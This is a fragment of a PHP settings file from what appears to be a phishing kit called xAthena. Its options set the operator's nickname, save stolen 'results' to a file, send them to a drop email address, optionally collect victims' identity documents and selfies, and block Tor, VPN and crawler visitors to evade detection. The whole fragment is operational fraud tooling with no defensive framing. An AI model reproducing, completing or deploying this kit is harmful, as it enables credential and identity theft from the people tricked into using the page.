...
*/
	...
	// ================================= //
	// ================================= //
	$scamname = "♣ Y$R ♣";	    		 // *Change |xAthena| to any name you want |Your Nick Name|
	// ================================= //
	// ================================= //
	$saveintext = "yes";   // If you don`t want the scam save the Rezlt/ Result in Text Edit |yes| to |no|
	$filename = "HoPoi01Uhsd"; // Change |stored| to any name you want this will be the Rzlt file name
	// ================================= //
	// ================================= //
	$sendtoemail = "yes";  // If you don`t want the scam Send the Rezlt/ Result to email Edit |yes| to |no|
	$yours = "mrysr@yahoo.com"; 	 // <-- 💎 Your Email Here 💎 
	// ================================= //
	// ================================= //
	...
	$show_identity ="no"; 				 // If you don`t want to show ||Identity/Selfiy|| edit |yes| to |no| 
	// ================================= //
	// ================================= //
	// ********* IP Protection ********* //
	...
	$fuck_tor = "false";					// If you don`t want to disallow Tor Users change true to xAthena
	$fuck_vpn = "false";					// If you don`t want to disallow VPN Users change true to xAthena
	$fuck_crawler = "false";				// If you don`t want to disallow Crawler Users change true to xAthena
	// ================================= //
	// ================================= //
	/////////////////DATE-function//////////////////////
	function now() {
